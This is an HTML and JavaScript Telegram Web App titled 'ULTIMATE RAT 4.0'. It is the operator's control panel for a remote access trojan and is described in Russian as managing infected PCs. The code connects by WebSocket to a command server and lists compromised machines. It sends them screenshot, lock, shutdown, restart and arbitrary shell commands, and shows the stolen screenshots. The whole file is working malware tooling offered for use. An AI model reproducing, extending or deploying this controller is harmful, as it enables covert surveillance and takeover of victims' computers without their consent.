<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ULTIMATE RAT CONTROL</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #0a0f1e 0%, #1a1a2e 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: #fff;
            min-height: 100vh;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            text-align: center;
            padding: 30px 0;
            background: rgba(0,0,0,0.3);
            border-radius: 20px;
            margin-bottom: 30px;
        }
        
        .header h1 {
            font-size: 2.5em;
            background: linear-gradient(45deg, #e94560, #ff6b6b);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .server-config {
            background: rgba(0,0,0,0.3);
            border-radius: 15px;
            padding: 15px;
            margin-bottom: 20px;
        }
        
        .server-config h3 {
            margin-bottom: 10px;
        }
        
        .server-config input {
            background: rgba(255,255,255,0.1);
            border: 1px solid #e94560;
            color: white;
            padding: 8px;
            border-radius: 8px;
            width: 180px;
            margin: 5px;
        }
        
        .server-config button {
            background: #e94560;
            border: none;
            padding: 8px 15px;
            border-radius: 8px;
            color: white;
            cursor: pointer;
        }
        
        .client-card {
            background: rgba(255,255,255,0.05);
            border-radius: 15px;
            padding: 15px;
            margin-bottom: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .client-card:hover {
            background: rgba(255,255,255,0.1);
            transform: translateX(5px);
        }
        
        .client-card.selected {
            background: linear-gradient(135deg, #e94560, #c73b54);
            box-shadow: 0 5px 20px rgba(233,69,96,0.3);
        }
        
        .client-name {
            font-size: 1.2em;
            font-weight: bold;
        }
        
        .client-ip {
            font-size: 0.8em;
            opacity: 0.7;
        }
        
        .menu-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
            gap: 15px;
            margin-top: 30px;
        }
        
        .menu-btn {
            background: rgba(255,255,255,0.05);
            border: none;
            padding: 15px;
            border-radius: 10px;
            color: #fff;
            font-size: 1em;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .menu-btn:hover {
            background: #e94560;
            transform: translateY(-3px);
        }
        
        .menu-btn.danger {
            background: rgba(220,53,69,0.2);
        }
        
        .menu-btn.danger:hover {
            background: #dc3545;
        }
        
        .status-bar {
            background: rgba(0,0,0,0.5);
            border-radius: 10px;
            padding: 10px;
            margin-top: 20px;
            text-align: center;
            font-size: 0.9em;
        }
        
        .command-output {
            background: rgba(0,0,0,0.5);
            border-radius: 10px;
            padding: 15px;
            margin-top: 20px;
            font-family: monospace;
            font-size: 0.9em;
            max-height: 200px;
            overflow-y: auto;
        }
        
        .screenshot {
            margin-top: 20px;
            text-align: center;
        }
        
        .screenshot img {
            max-width: 100%;
            border-radius: 10px;
            border: 2px solid #e94560;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔥 ULTIMATE RAT 4.0 🔥</h1>
            <p>Управление заражёнными ПК</p>
        </div>
        
        <div class="server-config">
            <h3>🌐 Настройки сервера</h3>
            <input type="text" id="serverIp" placeholder="IP сервера" value="192.168.1.8">
            <input type="text" id="serverPort" placeholder="Порт" value="5556">
            <button onclick="connectToServer()">🔌 Подключиться</button>
            <span id="connStatus" style="margin-left: 10px;">❌ Не подключен</span>
        </div>
        
        <div id="clients-list"></div>
        
        <div id="commands-panel" style="display: none;">
            <div class="menu-grid">
                <button class="menu-btn" onclick="sendCommand('screen')">📸 Скриншот</button>
                <button class="menu-btn" onclick="sendCommand('lock')">🔒 Блокировка</button>
                <button class="menu-btn" onclick="sendCommand('shutdown')">💀 Выключение</button>
                <button class="menu-btn" onclick="sendCommand('restart')">🔄 Перезагрузка</button>
                <button class="menu-btn" onclick="openShell()">💻 Shell</button>
            </div>
            
            <div class="command-output" id="output"></div>
            <div class="screenshot" id="screenshot"></div>
        </div>
        
        <div class="status-bar" id="status">
            📡 Ожидание выбора клиента...
        </div>
    </div>
    
    <script>
        let tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();
        
        let currentClient = null;
        let ws = null;
        
        function connectToServer() {
            let ip = document.getElementById('serverIp').value;
            let port = document.getElementById('serverPort').value;
            
            try {
                ws = new WebSocket(`ws://${ip}:${port}`);
                
                ws.onopen = function() {
                    document.getElementById('connStatus').innerHTML = '✅ Подключен';
                    document.getElementById('connStatus').style.color = '#00ff00';
                    addOutput('🟢 Подключен к серверу');
                };
                
                ws.onmessage = function(event) {
                    let data = JSON.parse(event.data);
                    handleServerMessage(data);
                };
                
                ws.onerror = function(error) {
                    addOutput('❌ Ошибка WebSocket: ' + error);
                };
                
                ws.onclose = function() {
                    document.getElementById('connStatus').innerHTML = '❌ Отключен';
                    document.getElementById('connStatus').style.color = '#ff0000';
                    addOutput('🔴 Отключен от сервера');
                };
            } catch(e) {
                addOutput('❌ Ошибка подключения: ' + e.message);
            }
        }
        
        function handleServerMessage(data) {
            if (data.type === 'clients') {
                updateClientsList(data.clients);
            } else if (data.type === 'screenshot') {
                displayScreenshot(data.image);
            } else if (data.type === 'command_result') {
                addOutput(`📟 ${data.result}`);
            }
        }
        
        function updateClientsList(clientsList) {
            let container = document.getElementById('clients-list');
            container.innerHTML = '';
            
            for (let id in clientsList) {
                let div = document.createElement('div');
                div.className = 'client-card';
                div.setAttribute('data-id', id);
                div.onclick = () => selectClient(id);
                div.innerHTML = `
                    <div class="client-name">🖥️ ${id}</div>
                    <div class="client-ip">${clientsList[id].ip || 'online'}</div>
                `;
                container.appendChild(div);
            }
            
            if (Object.keys(clientsList).length === 0) {
                container.innerHTML = '<div style="text-align:center;padding:20px;">⚠️ Нет активных клиентов</div>';
            } else {
                addOutput(`📡 Получено ${Object.keys(clientsList).length} клиентов`);
            }
        }
        
        function selectClient(clientId) {
            currentClient = clientId;
            
            document.querySelectorAll('.client-card').forEach(card => {
                card.classList.remove('selected');
            });
            document.querySelector(`[data-id="${clientId}"]`).classList.add('selected');
            
            document.getElementById('commands-panel').style.display = 'block';
            document.getElementById('status').innerHTML = `✅ Управление: ${clientId}`;
            addOutput(`✅ Выбран клиент: ${clientId}`);
        }
        
        function sendCommand(cmd) {
            if (!currentClient) {
                alert('Сначала выбери клиента!');
                return;
            }
            
            if (!ws || ws.readyState !== WebSocket.OPEN) {
                alert('Нет подключения к серверу!');
                return;
            }
            
            ws.send(JSON.stringify({
                type: 'command',
                client_id: currentClient,
                command: cmd
            }));
            
            addOutput(`📤 Отправлено: ${cmd}`);
        }
        
        function openShell() {
            let shellCmd = prompt('Введи команду для выполнения:');
            if (shellCmd) {
                if (!ws || ws.readyState !== WebSocket.OPEN) {
                    alert('Нет подключения к серверу!');
                    return;
                }
                
                ws.send(JSON.stringify({
                    type: 'shell',
                    client_id: currentClient,
                    command: shellCmd
                }));
                
                addOutput(`💻 Выполнено: ${shellCmd}`);
            }
        }
        
        function displayScreenshot(imageData) {
            let container = document.getElementById('screenshot');
            container.innerHTML = `<img src="data:image/png;base64,${imageData}">`;
            addOutput('📸 Скриншот получен');
        }
        
        function addOutput(text) {
            let output = document.getElementById('output');
            let time = new Date().toLocaleTimeString();
            output.innerHTML += `[${time}] ${text}\n`;
            output.scrollTop = output.scrollHeight;
        }
        
        // Автоподключение при загрузке
        setTimeout(() => {
            connectToServer();
        }, 500);
        
        // Кнопка обновления списка
        tg.MainButton.setText("Обновить список");
        tg.MainButton.onClick(() => {
            if (ws && ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify({type: 'get_clients'}));
                addOutput('🔄 Обновление списка клиентов...');
            } else {
                addOutput('❌ Нет подключения к серверу. Нажми "Подключиться"');
            }
        });
        tg.MainButton.show();
        
        addOutput('🔥 ULTIMATE RAT 4.0 готов к работе');
        addOutput('📡 Введи IP сервера и нажми "Подключиться"');
    </script>
</body>
</html>
